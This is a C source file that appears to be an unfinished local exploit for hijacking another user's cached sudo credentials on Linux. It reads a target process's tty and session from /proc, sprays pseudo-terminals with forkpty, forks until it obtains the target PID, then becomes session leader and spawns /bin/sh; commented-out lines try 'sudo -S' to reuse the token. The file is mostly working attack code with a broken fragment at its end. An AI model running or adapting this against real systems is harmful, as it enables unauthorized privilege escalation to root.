#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <pty.h>
#include <termios.h>
#include <fcntl.h>

#include <sys/select.h>
#include <sys/wait.h>

#include <stdio.h>
#include <unistd.h>
#include <limits.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/types.h>
#include <unistd.h>

#define SHELL "/bin/sh"

#define error(msg, ...) { fprintf(stderr, #__VA_ARGS__); exit(1); }

typedef struct statstruct_proc {
  int           pid;                      /** The process id. **/
  char          exName [_POSIX_PATH_MAX]; /** The filename of the executable **/
  char          state; /** 1 **/          /** R is running, S is sleeping, 
			   D is sleeping in an uninterruptible wait,
			   Z is zombie, T is traced or stopped **/
  unsigned      euid,                      /** effective user id **/
                egid;                      /** effective group id */					     
  int           ppid;                     /** The pid of the parent. **/
  int           pgrp;                     /** The pgrp of the process. **/
  int           session;                  /** The session id of the process. **/
  int           tty;                      /** The tty the process uses **/
  int           tpgid;                    /** (too long) **/
  unsigned int	flags;                    /** The flags of the process. **/
  unsigned int	minflt;                   /** The number of minor faults **/
  unsigned int	cminflt;                  /** The number of minor faults with childs **/
  unsigned int	majflt;                   /** The number of major faults **/
  unsigned int  cmajflt;                  /** The number of major faults with childs **/
  int           utime;                    /** user mode jiffies **/
  int           stime;                    /** kernel mode jiffies **/
  int		cutime;                   /** user mode jiffies with childs **/
  int           cstime;                   /** kernel mode jiffies with childs **/
  int           counter;                  /** process's next timeslice **/
  int           priority;                 /** the standard nice value, plus fifteen **/
  unsigned int  timeout;                  /** The time in jiffies of the next timeout **/
  unsigned int  itrealvalue;              /** The time before the next SIGALRM is sent to the process **/
  int           starttime; /** 20 **/     /** Time the process started after system boot **/
  unsigned int  vsize;                    /** Virtual memory size **/
  unsigned int  rss;                      /** Resident Set Size **/
  unsigned int  rlim;                     /** Current limit in bytes on the rss **/
  unsigned int  startcode;                /** The address above which program text can run **/
  unsigned int	endcode;                  /** The address below which program text can run **/
  unsigned int  startstack;               /** The address of the start of the stack **/
  unsigned int  kstkesp;                  /** The current value of ESP **/
  unsigned int  kstkeip;                 /** The current value of EIP **/
  int		signal;                   /** The bitmap of pending signals **/
  int           blocked; /** 30 **/       /** The bitmap of blocked signals **/
  int           sigignore;                /** The bitmap of ignored signals **/
  int           sigcatch;                 /** The bitmap of catched signals **/
  unsigned int  wchan;  /** 33 **/        /** (too long) **/
  int		sched, 		  /** scheduler **/
                sched_priority;		  /** scheduler priority **/
		
} procinfo;

int get_proc_info(pid_t pid, procinfo * pinfo)
{
  char szFileName [_POSIX_PATH_MAX],
    szStatStr [2048],
    *s, *t;
  FILE *fp;
  struct stat st;
  
  if (NULL == pinfo) {
    errno = EINVAL;
    return -1;
  }

  sprintf (szFileName, "/proc/%u/stat", (unsigned) pid);
  
  if (-1 == access (szFileName, R_OK)) {
    return (pinfo->pid = -1);
  } /** if **/

  if (-1 != stat (szFileName, &st)) {
  	pinfo->euid = st.st_uid;
  	pinfo->egid = st.st_gid;
  } else {
  	pinfo->euid = pinfo->egid = -1;
  }
  
  
  if ((fp = fopen (szFileName, "r")) == NULL) {
    return (pinfo->pid = -1);
  } /** IF_NULL **/
  
  if ((s = fgets (szStatStr, 2048, fp)) == NULL) {
    fclose (fp);
    return (pinfo->pid = -1);
  }

  /** pid **/
  sscanf (szStatStr, "%u", &(pinfo->pid));
  s = strchr (szStatStr, '(') + 1;
  t = strchr (szStatStr, ')');
  strncpy (pinfo->exName, s, t - s);
  pinfo->exName [t - s] = '\0';
  
  sscanf (t + 2, "%c %d %d %d %d %d %u %u %u %u %u %d %d %d %d %d %d %u %u %d %u %u %u %u %u %u %u %u %d %d %d %d %u",
	  /*       1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33*/
	  &(pinfo->state),
	  &(pinfo->ppid),
	  &(pinfo->pgrp),
	  &(pinfo->session),
	  &(pinfo->tty),
	  &(pinfo->tpgid),
	  &(pinfo->flags),
	  &(pinfo->minflt),
	  &(pinfo->cminflt),
	  &(pinfo->majflt),
	  &(pinfo->cmajflt),
	  &(pinfo->utime),
	  &(pinfo->stime),
	  &(pinfo->cutime),
	  &(pinfo->cstime),
	  &(pinfo->counter),
	  &(pinfo->priority),
	  &(pinfo->timeout),
	  &(pinfo->itrealvalue),
	  &(pinfo->starttime),
	  &(pinfo->vsize),
	  &(pinfo->rss),
	  &(pinfo->rlim),
	  &(pinfo->startcode),
	  &(pinfo->endcode),
	  &(pinfo->startstack),
	  &(pinfo->kstkesp),
	  &(pinfo->kstkeip),
	  &(pinfo->signal),
	  &(pinfo->blocked),
	  &(pinfo->sigignore),
	  &(pinfo->sigcatch),
	  &(pinfo->wchan));
  fclose (fp);
  return 0;
}

void spawn_shell_with_pid(pid_t pid_target) {
	pid_t pid = getpid();

	while (pid != pid_target) {
		pid = fork();
		if (pid == -1) {
			return 1;
		}
		if (pid == 0) {
			pid = getpid();
			if (pid != pid_target) {
				exit(1);
			}
			else {
				printf("[+] SHELLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL\n");
				setsid(); // be session leader to be taken seriously by sudo
				setpgid(0, 0);
				execlp(SHELL, SHELL, NULL);
				printf("ERROR: execlp Failed\n");
			}
		} else {
			printf("pid = %d\n", pid);
			int wstatus = 0;
			waitpid(pid, &wstatus, 0);
		}
	}
}

int main(int ac, char **av) {

	// instanciate a sudo token for this process
	// current tty
	// no tty
	// accessible tty
	// killtty ?
	// accessible tty
	if (ac <= 1) {
		fprintf(stderr, "Usage: %s [pid_to_attack]\n", av[0]);
		return 1;
	}
	// if no tty then kill and get the pid
	// get pid tty and pid
	// spray all tty
	// kill the pid
	// get the pid tty
	// case 1: tty + session id
	// case 2: parent pid + session id
	pid_t target_pid = atoi(av[1]);
	procinfo pinfo_target;
	get_proc_info(target_pid, &pinfo_target);
	printf("tty %d\n", pinfo_target.tty);
	printf("session %d\n", pinfo_target.session);
	/* if (tty == 0 // no tty  */
	int master;
	pid_t pid;
	char name[256];

	printf("start\n");
	for (size_t i = 0; i < 0xffff; i++) {
		pid = forkpty(&master, (char*)&name, NULL, NULL);
		if (pid < 0) error("ERROR: forkpty\n");
		if (pid == 0) {
			/* printf("child %d\n", getpid()); */
			/* execlp(SHELL, SHELL, "-c", "tty >> /tmp/tty", NULL); */
			/* execlp("sudo", "sudo", "-S", "ls", NULL); */
			/* system("echo | sudo -S ./activate_sudo_token >/dev/null 2>&1"); */
			/* close(0); */
			/* execlp("sudo", "sudo", "-S", "./activate_sudo_token", 0); */
			/* execlp("true", "true", 0); */
			exit(42);
		} else {
			printf("parent %d, child %d on %s\n", getpid(), pid, name);
			int wstatus = 0;
			waitpid(pid, &wstatus, 0);
			printf("wstatus = %d\n", wstatus);
			close(master);
			if (wstatus != 256) {
				return 0;
			}
		}
	}
	return 0;
}
/* int main() { */
/* 	int master; */
/* 	pid_t pid; */
/*  */
/* 	printf("start\n"); */
/* 	pid = forkpty(&master, NULL, NULL, NULL); */
/* 	if (pid < 0) error("ERROR: fork_pty\n"); */
/* 	if (pid == 0) { */
/* 		printf("child %d\n", getpid()); */
/* 		#<{(| execlp(SHELL, SHELL, "-c", "tty >> /tmp/tty", NULL); |)}># */
/* 		execlp("sudo", "sudo", "-S", "ls", NULL); */
/* 	} else { */
/* 		printf("parent %d, child %d\n", getpid(), pid); */
/* 		int wstatus = 0; */
/* 		waitpid(pid, &wstatus, 0); */
/* 	} */
/* 	return 0; */
